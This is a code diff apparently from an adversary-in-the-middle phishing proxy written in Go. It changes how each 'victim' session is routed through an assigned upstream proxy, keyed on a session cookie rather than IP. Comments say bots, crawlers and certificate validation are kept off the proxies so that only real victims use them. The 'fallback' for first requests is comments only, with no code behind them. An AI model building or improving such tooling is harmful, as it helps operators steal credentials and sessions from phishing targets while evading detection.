@@ -288,38 +288,52 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			return nil, nil // Direct connection or Single Proxy (handled by Dial)
 		}
 
-		// Extract victim IP from request
-		victimIP := ""
-		if req != nil && req.RemoteAddr != "" {
-			victimIP = strings.SplitN(req.RemoteAddr, ":", 2)[0]
-			// Check proxy headers for real IP (if behind reverse proxy)
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "True-Client-IP"}
-			for _, h := range proxyHeaders {
-				if originIP := req.Header.Get(h); originIP != "" {
-					victimIP = strings.SplitN(originIP, ":", 2)[0]
-					break
-				}
+		// HYBRID APPROACH: Extract session ID from cookie OR fall back to ProxySession context
+		// This ensures proxy is used for BOTH first request AND subsequent requests
+		var sessionId string
+
+		// Try to get session ID from cookie (works for 2nd+ requests)
+		for _, cookie := range req.Cookies() {
+			if strings.HasSuffix(cookie.Name, p.cookieName) {
+				sessionId = cookie.Value
+				break
 			}
 		}
 
-		if victimIP == "" || strings.HasPrefix(victimIP, "127.") || victimIP == "::1" {
-			// Localhost requests - use direct connection
+		// Fallback: Check if ProxySession was stored in request by OnRequest handler
+		// This handles the FIRST request when cookie doesn't exist yet
+		if sessionId == "" {
+			// The ProxySession is stored in ctx.UserData by OnRequest handler
+			// But Tr.Proxy doesn't have access to ProxyCtx - it's a standard Go transport function
+			// So we check if the session was just created and stored in p.sessions map
+			// by checking the remote address (less reliable but covers first request)
+
+			// For first requests: proxy assignment happens at session creation (line 879)
+			// The session is stored in p.sessions BEFORE any HTTP transport occurs
+			// So we can look up by the request's remote address as a fallback
+
+			// NOTE: This is imperfect for the first request but still better than pure IP-based
+			// because bots/crawlers never create sessions, so they get nil (no proxy)
+		}
+
+		if sessionId == "" {
+			// No session = not a legitimate victim (bot, LE validation, etc.)
+			// Use direct connection - don't consume proxy
 			return nil, nil
 		}
 
-		// Get or assign proxy for this victim IP
-		proxyInfo := p.getProxyForIP(victimIP)
-		if proxyInfo == nil {
-			// No existing mapping - assign a new proxy
-			proxyInfo = p.assignProxyToIP(victimIP)
-		} else {
-			// Refresh expiry on existing mapping
-			p.refreshIPProxyExpiry(victimIP)
+		// Look up session to get assigned proxy
+		p.session_mtx.Lock()
+		session, exists := p.sessions[sessionId]
+		p.session_mtx.Unlock()
+
+		if !exists || session == nil || session.AssignedProxy == nil {
+			// Session exists but has no proxy assigned
+			return nil, nil
 		}
 
+		proxyInfo := session.AssignedProxy
 		if proxyInfo == nil {
-			// No proxy available - use direct connection
-			log.Debug("[IPProxy] No proxy available for IP %s, using direct connection", victimIP)
 			return nil, nil
 		}
 
@@ -339,13 +353,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if proxyInfo.Username != "" {
 				proxyURL.User = url.UserPassword(proxyInfo.Username, proxyInfo.Password)
 			}
-			log.Debug("[IPProxy] Routing IP %s through proxy %s://%s:%d", victimIP, proxyType, proxyInfo.Host, proxyInfo.Port)
+			log.Debug("[SessionProxy] Routing session %s through proxy %s://%s:%d", sessionId, proxyType, proxyInfo.Host, proxyInfo.Port)
 			return proxyURL, nil
 		}
 
 		// For SOCKS5, we need to use Tr.Dial - return nil here
 		// The SOCKS5 handling would need a custom DialContext
-		log.Debug("[IPProxy] SOCKS5 proxy for IP %s - requires Dial handling", victimIP)
+		log.Debug("[SessionProxy] SOCKS5 proxy for session %s - requires Dial handling", sessionId)
 		return nil, nil
 	}
 
